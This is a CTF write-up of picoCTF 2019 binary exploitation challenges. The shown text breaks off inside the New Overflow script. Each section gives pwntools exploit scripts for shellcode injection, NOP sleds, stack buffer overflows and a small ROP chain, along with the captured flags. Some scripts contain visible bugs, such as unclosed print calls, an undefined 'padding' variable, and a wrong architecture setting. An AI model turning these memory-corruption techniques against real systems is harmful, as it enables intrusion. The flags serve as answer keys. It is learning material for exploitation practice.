# PICO CTF (2019)<a name="picoctf19"></a>
[<p align="right">back to main</p>](https://github.com/Ordered-Chaos/Pwnfolio#main)
***
## Table of Contents
| Problem | Category | Points | Problem | Category | Points |
| ------- | -------- | ------ | ------- | -------- | ------ | 
| [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | [Overflow 0](#overflow0) | Binary Exploitation | 100 |
| [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 | [Overflow 1](#overflow1) | Binary Exploitation | 150 |
| [New Overflow](#newoverflow) | Binary Exploitation | 200 | [Overflow 2](#overflow2) | Binary Exploitation | 250 |
| [New Overflow2](#newoverflow2) | Binary Exploitation | 250 | Canary | Binary Exploitation | 300 |
***

## HANDY SHELLCODE <a name="handyshellcode"></a>

> ### Problem 
>> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. 
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/handshellcodesource.md#handyshellsource)
>
> ### Solution
>> The solution here is pretty straightforward. All you need to do is supply the program with shellcode
>> and it will execute it. A simple pwntools script using `shellcraft.sh()` as the payload can get this done.

~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

shellcode = asm(shellcraft.sh())

payload = shellcode

print(repr(io.recv())
io.sendline(payload)

print(repr(io.recv())
io.sendline('cat flag.txt')

print(repr(io.recv())

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*

[Return to Top](#picoctf19)
***

## SLIPPERY SHELLCODE <a name="slipperyshellcode"></a>

> ### Problem 
>> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/slipperyshellcode.md#slipperyshellsource1)
>
> ### Solution
>> In this challenge we again need to supply the program with shellcode using `shellcraft.sh()`. The source code
>> reveals that this time, the program will begin execution of the shellcode from a random location within a 256 
>> byte range. To make sure that we execute our code, all that needs to be done is to supply an 'x\90' NOP sled
>> that's 256 bytes long directly preceding the shellcode. This can be done with the following pwntools script.

~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

padding = b'\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print(io.recv())

io.sendline(payload)

print(io.recv())

io.sendline(b'cat flag.txt')

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*

[Return to Top](#picoctf19)
***
## OVERFLOW 0<a name="overflow0"></a>

> ### Problem
>> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in 
>> /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow0source.md#overflow0source1)

> ###  Solution
>> After looking at the program, you can tell that it checks to see if `argv[]` is greater or less than the buffer. If it is, then it prints the flag file.
>> So all we have to do is call `./vuln` with more than 64 arguments.
~~~bash
kali@kali:~/ctf/pico/overflow0$ ssh User@2019shell1.picoctf.com 'cd /problems/
overflow-0_1_54d12127b2833f7eab9758b43e88d3b7; ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
~~~

**Flag:** *picoCTF{3asY_P3a5yb197d4e2}*

[Return to Top](#picoctf19)
***

## OVERFLOW 1<a name="overflow1"></a>

> ### Problem
>> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? 
>> You can find it in /problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow1source.md#overflow1source1)

> ### Solution
>> To solve this challenge there are a few boxes we need to check. We need to:

>> - [ ] **Find out how long the buffer is and at what point we overwrite the `eip` register**
>>> To do this I used pwntools script like the one below except I set the payload to `payload = cyclic(512)` 
>>> as well as added the line `gdb.attach(io, gdbscript='b* main')`. This allows you to open the file in pwndbg and 
>>> send a 512 byte long cyclic pattern to make it crash. After the crash you can see that the `eip` register was overwritten
>>> at `'taaa'` in the pattern. 
>>
>> - [ ] **Find the address of the flag function**
>>> Using radare2's `afl` command your able to see a list of functions with addresses. This list includes the flag function.
>> 
>> - [ ] **Craft a payload that fills up the buffer up to `eip`, then overwrite `eip` with the flag function address**
>>>  A pwntools script like the one below can get the job done.

~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

padding = cyclic(cyclic_find('taaa'))
flag = p32(0x080485e6)

payload = padding 
payload += flag

print(repr(io.recv())
io.sendline(payload)

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}*

[Return to Top](#picoctf19)
***

## OVERFLOW 2<a name="overflow2"></a>

> ### Problem
>> Now try overwriting arguments. Can you get the flag from this program? You can find it in 
>> /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow2source.md#overflow2source1)

> ### Solution
>> The solution here is the mostly the same as in [Overflow 1](#overflow) except this time the flag function
>> needs to be provided 2 arguments, `0xdeadbeef` and `0xc0ded00d`. So all we need to to do is:
>>
>> - [ ] **Find the length of junk input needed to overwrite `eip`**
>>> To do this I used pwntools script like the one below except I set the payload to `payload = cyclic(512)` 
>>> as well as added the line `gdb.attach(io, gdbscript='b* main')`. This allows you to open the file in pwndbg and 
>>> send a 512 byte long cyclic pattern to make it crash. After the crash you can see that the `eip` register was overwritten
>>> at `'waab'` in the pattern. 
>>>
>> - [ ] **Find the address of the flag function**
>>>  Using radare2's `afl` command your able to see a list of functions with addresses. This list includes the flag function.
>>>
>> - [ ] **Write an exploit that calls the flag function and supplies the two argurments**
>>> A pwntools script like the one below can get the job done.

~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

adding = cyclic(cyclic_find('waab'))           # location of pattern match @ eip
argu1 = p32(0xdeadbeef)                        # first argurment to pass to flag function
argu2 = p32(0xc0ded00d)                        # second argument to pass to flag function
rop = p32(0x0804878a)                          # pop edi; pop ebp; ret;
flag = p32(0x080485e6)                         # address of flag function

payload = padding 
payload += flag
payload += rop
payload += argu1
payload += argu2

print(repr(io.recv())
io.sendline(payload)

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{arg5_and_r3turn51b106031}*

[Return to Top](#picoctf19)
***

##  New Overvflow<a name="newoverflow"></a>

> ### Problem
>> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return 
>> address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e
>> 5dbad939821e43cf123 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/newoverflow.md#newoverflowsource1)

> ### Solution
>> The only thing that changed here is that now the overflow is on a 64 bit binary. One thing to note is that
>> when running the exploit, the stack my be misaligned. In order to fix this I added the address of a return
>> ROP gadget. Calling `main` before the flag function also re-aligns the stack.
~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
